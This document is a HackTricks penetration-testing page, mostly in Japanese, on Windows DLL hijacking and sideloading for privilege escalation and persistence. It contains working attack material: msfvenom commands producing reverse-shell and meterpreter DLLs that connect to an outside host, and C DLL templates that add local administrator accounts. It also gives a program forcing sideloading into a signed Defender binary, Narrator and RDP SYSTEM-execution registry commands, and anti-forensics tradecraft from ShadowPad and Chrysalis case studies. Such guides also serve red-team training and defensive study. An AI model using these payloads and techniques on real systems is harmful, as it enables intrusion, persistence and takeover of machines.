# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませる操作を指します。この用語は **DLL Spoofing, Injection, and Side-Loading** のような複数の戦術を包含します。主に code execution、persistence を目的として利用され、稀に privilege escalation に使われます。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的にかかわらず基本的に同じです。

### 一般的な手法

DLL hijacking に用いられる手法はいくつかあり、それぞれがアプリケーションの DLL ロード戦略によって有効性が異なります:

1. **DLL Replacement**: 正規の DLL を悪意のあるものと入れ替える。必要に応じて元の DLL の機能を維持するために DLL Proxying を使用する場合もある。
2. **DLL Search Order Hijacking**: 悪意の DLL を正規のものより先に検索されるパスに配置し、アプリケーションの検索パターンを悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要な DLL と誤認して読み込むように、悪意の DLL を作成する。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` といった検索パラメータを変更して、アプリケーションを悪意のある DLL に向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のあるものと置き換える。DLL side-loading に関連することが多い手法。
6. **Relative Path DLL Hijacking**: コピーしたアプリと共にユーザーが制御するディレクトリに悪意の DLL を置き、Binary Proxy Execution に似た動作をさせる。

> [!TIP]
> DLL sideloading の上に HTML staging、AES-CTR configs、.NET implants を重ねるステップバイステップのチェーンについては、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 欠落している Dll の検索

システム内の欠落している Dll を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、次の 2 つのフィルタを設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、これを数秒間実行し続けてください。\
特定の実行ファイル内の **missing dll** を探す場合は、**"Process Name" "contains" `<exec name>`** のような別のフィルタを設定し、対象の実行を行ってからイベントのキャプチャを停止してください。

## 欠落している Dll の悪用

権限を昇格させるための最善の方法は、特権プロセスが読み込もうとする **dll を、プロセスが検索する場所のいずれかに書き込める** ことです。したがって、**元の dll** が存在するフォルダより先に検索されるフォルダに **dll を書き込める**（特殊なケース）、または検索対象のフォルダに **dll を書き込めて** かつその **dll がどのフォルダにも存在しない** 場合に利用できます。

### Dll 検索順序

**次の** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **に、Dll が具体的にどのように読み込まれるかが記載されています。**

Windows アプリケーションは、事前定義された一連の検索パスに従って DLL を探します。悪意のある DLL がこれらのディレクトリのいずれかに戦略的に配置され、正規の DLL より先に読み込まれると DLL hijacking の問題が発生します。これを防ぐには、アプリケーションが必要な DLL を絶対パスで参照するようにすることが有効です。

以下は 32-bit システム上の **DLL search order** です:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

これは **SafeDllSearchMode** が有効になっている場合の既定の検索順序です。無効にするとカレントディレクトリが 2 番目に上がります。この機能を無効にするには、レジストリ値 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** を作成し、値を 0 に設定してください（既定は有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** で呼ばれると、検索は **LoadLibraryEx** がロードしている実行モジュールのディレクトリから開始されます。

最後に、dll が単に名前ではなく絶対パスで指定されて読み込まれることがある点に注意してください。その場合、その dll はそのパスのみで検索されます（その dll に依存関係がある場合、依存関係は名前で読み込まれたものとして検索されます）。

検索順序を変更する他の方法もありますが、ここでは詳述しません。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介した sideloading の強制

プロセス作成時に ntdll のネイティブ API を使って RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することで、新しく作成されるプロセスの DLL 検索パスに決定論的に影響を与える高度な方法があります。ここに攻撃者が制御するディレクトリを渡すと、絶対パスでなく名前でインポートされた（または LoadLibrary により名前で解決される）ターゲットプロセスは、そのディレクトリから悪意のある DLL を読み込むよう強制され得ます。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、カスタムの DllPath を提供して自分が制御するフォルダ（例: ドロッパー／アンパッカーのディレクトリ）を指すようにする。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが名前で DLL を解決するとき、ローダは解決中にこの提供された DllPath を参照するため、悪意の DLL がターゲット EXE と同じ場所にない場合でも信頼性のある sideloading が可能になる。

Notes/limitations
- これは作成される子プロセスに影響するもので、現在のプロセスにのみ影響する SetDllDirectory とは異なります。
- ターゲットは名前で DLL をインポートしているか、LoadLibrary で名前指定している必要があります（絶対パス使用や LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories の使用がないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。転送エクスポートや SxS が優先順位を変える場合があります。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用時の使用例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、実際のものをプロキシするもの）をあなたの DllPath ディレクトリに配置します。
- 上記の手法で名前で xmllite.dll を検索することが分かっている署名済みバイナリを起動します。ローダは指定された DllPath を通じてインポートを解決し、sideloads your DLL.

この手法は実際の事例でマルチステージの sideloading チェーンを駆動するのが観測されています：初期のランチャーがヘルパー DLL を配置し、それが Microsoft 署名の、ハイジャック可能なバイナリをカスタム DllPath で起動してステージングディレクトリから攻撃者の DLL を読み込ませます。

#### Windows ドキュメントにおける DLL 検索順序の例外

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**要件**:

- **異なる権限**（水平的または側方移動）で動作している、または動作する予定のプロセスで、**DLL が存在しない**ものを特定する。
- 対象の **DLL** が検索される任意の **ディレクトリ** に対して **書き込みアクセス** が可能であることを確認する。該当場所は実行ファイルのディレクトリや system path 内のディレクトリである場合がある。

そう、条件を満たす対象を見つけるのは複雑です。**デフォルトでは特権を持つ実行ファイルが DLL を欠いていることを見つけるのはかなり稀です**し、**system path のフォルダに書き込み権限を持つことはさらに稀です**（通常は不可能です）。しかし、設定ミスのある環境ではこれは可能です。\
もし運良く要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認すると良いでしょう。プロジェクトの **主目的は UAC をバイパスすること** ですが、使用可能な Windows バージョン向けの Dll hijaking の **PoC** が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変えるだけで済みます）。

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
また、executable の imports と dll の exports は次のコマンドで確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
System Path folder に書き込み権限がある状態で、**Dll Hijacking を悪用して権限昇格する方法**の完全なガイドについては、次を参照してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
この脆弱性を発見するための他の興味深い自動化ツールには **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### 例

悪用可能なシナリオを見つけた場合、成功させるために最も重要な点の一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートする **dll を作成すること** です。いずれにせよ、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) や [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) において有用であることに注意してください。実行目的の dll hijacking に焦点を当てたこの調査の中で、**有効な dll を作成する方法** の例を見つけることができます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)。\
さらに、**next sectio**n にはテンプレートとして、あるいは不要な関数をエクスポートした **dll を作る** のに役立ついくつかの **基本的な dll コード** が掲載されています。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に **Dll proxy** は、**ロード時に悪意のあるコードを実行する** ことができる Dll ですが、同時に **公開する** と **動作する** と **期待通りに**、**実際のライブラリへのすべての呼び出しを中継する** ことで機能します。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定してプロキシ化したいライブラリを選び、**プロキシ化された dll を生成する**、あるいは **Dll を指定してプロキシ化された dll を生成する** ことができます。

### **Meterpreter**

**rev shell (x64) を取得する:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86、x64版は見当たりませんでした):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分用

複数のケースでは、コンパイルした Dll は victim process によって読み込まれる複数の関数を **エクスポートする必要がある** ことに注意してください。これらの関数が存在しない場合、**binary はそれらを読み込めず**、**exploit は失敗します**。

<details>
<summary>C DLL テンプレート (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL のユーザー作成を伴う例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリ付きの代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows の Narrator.exe は起動時に予測可能な言語固有の localization DLL を参照し、これを hijack することで arbitrary code execution と persistence を実現できます。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- フィルター: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動し、上記パスのロード試行を観察します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 単純なハイジャックはUIで音声/ハイライト表示を行います。静かにするには、アタッチ時にNarratorのスレッドを列挙し、メインスレッドを(`OpenThread(THREAD_SUSPEND_RESUME)`)で開いて`SuspendThread`で停止し、自分のスレッドで処理を続行します。完全なコードはPoCを参照してください。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narratorを起動すると設置したDLLがロードされます。セキュアデスクトップ（ログオン画面）ではCTRL+WIN+ENTERを押すとNarratorが起動し、DLLはセキュアデスクトップ上でSYSTEMとして実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストにRDP接続し、ログオン画面でCTRL+WIN+ENTERを押すとNarratorが起動し、DLLがセキュアデスクトップでSYSTEMとして実行されます。
- 実行はRDPセッション終了時に停止します—速やかにinject/migrateしてください。

Bring Your Own Accessibility (BYOA)
- 組み込みのAccessibility Tool (AT)のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLLを指すように編集してインポートし、`configuration`をそのAT名に設定することで、Accessibilityフレームワーク経由で任意の実行をプロキシできます。

Notes
- `%windir%\System32`への書き込みやHKLMの値変更には管理者権限が必要です。
- すべてのペイロードロジックは`DLL_PROCESS_ATTACH`内で完結させることができ、エクスポートは不要です。

## ケーススタディ: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

このケースはLenovoのTrackPoint Quick Menu (`TPQMAssistant.exe`)における**Phantom DLL Hijacking**、追跡番号 **CVE-2025-1729** を示します。

### 脆弱性の詳細

- **コンポーネント**: `TPQMAssistant.exe` (場所: `C:\ProgramData\Lenovo\TPQM\Assistant\`)
- **スケジュールタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` はログオンしているユーザーのコンテキストで毎日9:30に実行されます。
- **ディレクトリ権限**: `CREATOR OWNER`によって書き込み可能で、ローカルユーザーが任意のファイルを配置できます。
- **DLL検索挙動**: まず作業ディレクトリから`hostfxr.dll`を読み込もうとし、存在しない場合は "NAME NOT FOUND" をログに記録します。これはローカルディレクトリの検索優先を示します。

### エクスプロイト実装

攻撃者は同じディレクトリに悪意のある`hostfxr.dll`スタブを置き、欠落したDLLを悪用してユーザーコンテキストでコード実行を得ることができます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に置く。
2. 現在のユーザーのコンテキストでスケジュールタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログオンしていると、悪意のある DLL が管理者のセッションで medium integrity の状態で実行される。
4. 標準的な UAC bypass 手法をチェーンして medium integrity から SYSTEM 特権へ昇格する。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

攻撃者はしばしば MSI ベースの droppers を DLL side-loading と組み合わせ、信頼された署名済みプロセスの下でペイロードを実行する。

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
実践的な sideloading (wsc_proxy.exe を使用)
- 同じフォルダに次の2つのファイルを配置する:
- wsc_proxy.exe: legitimate signed host (Avast)。プロセスは自ディレクトリから名前で wsc.dll をロードしようとする。
- wsc.dll: attacker DLL。特定の exports が不要なら DllMain だけで足りる。そうでなければ proxy DLL を作成し、必要な exports を genuine library にフォワードしつつ DllMain で payload を実行する。
- 最小限の DLL payload をビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件については、プロキシングフレームワーク（例: DLLirant/Spartacus）を使って、ペイロードも実行する転送 DLL を生成してください。

- この手法はホストバイナリによる DLL 名解決に依存します。ホストが絶対パスやセーフローディングフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使っている場合、ハイジャックは失敗する可能性があります。
- KnownDLLs、SxS、および forwarded exports は優先度に影響を与えるため、ホストバイナリとエクスポートセットの選定時に考慮する必要があります。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point は、Ink Dragon が ShadowPad を、正規ソフトと馴染ませつつコアペイロードをディスク上で暗号化したままにするために **three-file triad** を使って展開する方法を記述しています:

1. **Signed host EXE** – AMD、Realtek、NVIDIA といったベンダを悪用した例（`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前を Windows バイナリ風に変更する（例: `conhost.exe`）が、Authenticode signature は有効なままです。
2. **Malicious loader DLL** – EXE と同じ場所に期待される名前でドロップされる（`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`）。この DLL は通常 ScatterBrain フレームワークで難読化された MFC バイナリで、役割は暗号化されたブロブを見つけて復号し、ShadowPad をリフレクティブマップすることだけです。
3. **Encrypted payload blob** – 同ディレクトリに `<name>.tmp` として保存されることが多いです。復号したペイロードをメモリマップした後、ローダは TMP ファイルを削除してフォレンジック証拠を破壊します。

Tradecraft notes:

* 署名付き EXE の名前を変更しても PE ヘッダの `OriginalFileName` を保持すると、Windows バイナリを装いつつベンダ署名を維持できます。Ink Dragon が `conhost.exe` 風のバイナリ（実際は AMD/NVIDIA ユーティリティ）を置く手口を模倣してください。
* 実行ファイルが信頼されたままであるため、多くの allowlisting 制御は同じディレクトリに悪意ある DLL が存在するだけで通過します。ローダ DLL のカスタマイズに注力し、署名済みの親プロセスは通常そのまま実行できます。
* ShadowPad の復号器は TMP ブロブがローダの隣に存在し書き込み可能であることを期待しており、マップ後にファイルをゼロ化します。ペイロードがロードされるまでディレクトリを writable にしておき、メモリ上に展開された後で TMP ファイルを削除して OPSEC を保ってください。

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom 侵入では、信頼されたアップデートチェーンを悪用して NSIS パックの dropper を配布し、DLL sideload と完全にメモリ内で動作するペイロードを段階的に配置しました。

Tradecraft flow
- `update.exe` (NSIS) が `%AppData%\Bluetooth` を作成し、これを **HIDDEN** に設定して、名前を変えた Bitdefender Submission Wizard `BluetoothService.exe`、悪意ある `log.dll`、および暗号化ブロブ `BluetoothService` をドロップし、EXE を起動します。
- ホスト EXE は `log.dll` をインポートし、`LogInit`/`LogWrite` を呼び出します。`LogInit` はブロブを mmap ロードし、`LogWrite` はカスタム LCG ベースのストリーム（定数 **0x19660D** / **0x3C6EF35F**、キー素材は事前ハッシュから導出）で復号し、バッファを平文のシェルコードで上書きし、一時領域を解放してそこにジャンプします。
- IAT を避けるために、ローダはエクスポート名をハッシュ化して API を解決します（**FNV-1a basis 0x811C9DC5 + prime 0x1000193**）、その後 Murmur スタイルのアバランチ（**0x85EBCA6B**）を適用し、ソルト化されたターゲットハッシュと比較します。

Main shellcode (Chrysalis)
- 主要モジュールの PE 風データを、キー `gQ2JR&9;` を用いた add/XOR/sub の繰り返し（5 パス）で復号し、動的に `Kernel32.dll` → `GetProcAddress` をロードしてインポート解決を完了します。
- ランタイムで DLL 名文字列を再構築するために各文字ごとのビット回転/XOR 変換を行い、その後 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` をロードします。
- もう一つのリゾルバを用いて **PEB → InMemoryOrderModuleList** を辿り、各エクスポートテーブルを 4 バイトブロック単位で Murmur スタイルの混合を行い、ハッシュが見つからない場合のみ `GetProcAddress` にフォールバックします。

Embedded configuration & C2
- コンフィグはドロップされた `BluetoothService` ファイル内の **offset 0x30808**（サイズ **0x980**）に格納され、キー `qwhvb^435h&*7` で RC4 復号され、C2 URL と User-Agent が露出します。
- ビーコンはドット区切りのホストプロファイルを構築し、タグ `4Q` を先頭に付けてからキー `vAuig34%^325hGV` で RC4 暗号化し、HTTPS 経由で `HttpSendRequestA` を使って送信します。レスポンスは RC4 復号され、タグスイッチで振り分けられます（`4T` シェル、`4V` プロセス実行、`4W/4X` ファイル書き込み、`4Y` 読み取り/流出、`4\\` アンインストール、`4` ドライブ/ファイル列挙＋チャンク転送など）。
- 実行モードは CLI 引数で制御されます: 引数なし = 永続化をインストール（service/Run key）して `-i` を指す；`-i` は `-k` 付きで自己再起動；`-k` はインストールをスキップしてペイロードを実行します。

Alternate loader observed
- 同じ侵入では Tiny C Compiler をドロップし、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を実行し、隣に `libtcc.dll` が置かれていました。攻撃者提供の C ソースはシェルコードを埋め込み、コンパイルしてメモリ内で実行され、PE をディスクに置くことなく動作しました。Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC ベースのコンパイル・実行フェーズは実行時に `Wininet.dll` をインポートし、ハードコードされた URL から第2段階のシェルコードを取得して、コンパイラの実行を偽装する柔軟なローダーを提供していました。

## 参考資料

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
